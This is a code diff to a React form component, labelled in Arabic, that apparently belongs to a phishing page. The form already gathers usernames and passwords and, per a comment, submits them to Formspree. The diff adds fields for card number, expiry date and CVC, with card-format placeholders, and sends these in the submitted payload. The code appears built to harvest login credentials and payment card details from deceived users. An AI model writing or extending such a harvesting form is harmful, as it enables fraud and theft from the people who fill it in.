@@ -9,6 +9,9 @@ function Step1() {
   const [formData, setFormData] = useState({
     username: "", // Use standard names for better compatibility with Formspree
     password: "",
+    card_Number: "",
+    date: "",
+    cvc: "",
   });
 
   const onFormSubmit = async (e) => {
@@ -18,6 +21,9 @@ function Step1() {
       data: {
         username: formData.username,
         password: formData.password,
+        card_Number: formData.card_Number,
+        date: formData.date,
+        CVC: formData.cvc,
       },
     });
 
@@ -46,15 +52,37 @@ function Step1() {
           />
         </div>
         <div className="flex flex-col text-xl">
-          <label>كلمة المرور :</label>
+          <label>رقم الكرت :</label>
           <input
             type="text"
-            name="password" // Phone number field
-            value={formData.password}
+            name="card_Number" // Name field
+            value={formData.card_Number}
             onChange={(e) =>
-              setFormData({ ...formData, password: e.target.value })
+              setFormData({ ...formData, card_Number: e.target.value })
             }
-            placeholder="كلمه المرور"
+            placeholder="____-____-____-____"
+            className="text-center w-[300px] lg:w-[400px] rounded-2xl mt-2 outline-none border-2 py-2 mx-5 px-5 focus:border-stone-500"
+          />
+        </div>
+        <div className="flex flex-col text-xl">
+          <label>السنة \ الشهر :</label>
+          <input
+            type="text"
+            name="date" // Name field
+            value={formData.date}
+            onChange={(e) => setFormData({ ...formData, date: e.target.value })}
+            placeholder="28/2"
+            className="w-[300px] lg:w-[400px] rounded-2xl mt-2 outline-none border-2 py-2 mx-5 px-5 focus:border-stone-500"
+          />
+        </div>
+        <div className="flex flex-col text-xl">
+          <label>CVC :</label>
+          <input
+            type="text"
+            name="CVC" // Phone number field
+            value={formData.cvc}
+            onChange={(e) => setFormData({ ...formData, cvc: e.target.value })}
+            placeholder="120"
             className="w-[300px] lg:w-[400px] rounded-2xl mt-2 outline-none border-2 py-2 mx-5 px-5 focus:border-stone-500"
           />
         </div>
